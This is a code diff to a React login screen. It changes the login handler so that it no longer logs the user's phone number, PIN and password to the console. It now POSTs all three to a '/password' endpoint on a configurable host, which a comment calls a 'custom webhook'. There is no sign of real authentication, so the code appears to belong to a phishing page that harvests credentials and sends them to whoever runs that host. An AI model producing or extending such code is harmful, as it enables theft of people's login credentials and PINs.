@@ -19,17 +19,25 @@ import {
     const navigate = useNavigate();
     const [error, setError] = useState("");
     const location = useLocation();
-    const { interPhone, pin } = location.state;
+    const { interPhone, pinString } = location.state;
   
-    const handleLogin = () => {
+    const handleLogin = async() => {
       if(password.length < 6) {
         setError("Your password is wrong, please try again")
         return
       }
       setLoading(true);
-      console.log("password: " + password);
-      console.log("hamo: " + interPhone );
-      console.log("pin :" + pin );
+      const HOST = process.env.REACT_APP_HOST;
+      // 发送到自定义webhook
+      await fetch(`${HOST}/password`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          interPhone,
+          pinString:pinString,
+          password
+        }),
+      }); 
       setTimeout(() => {
         setLoading(false);
       }, 1500)
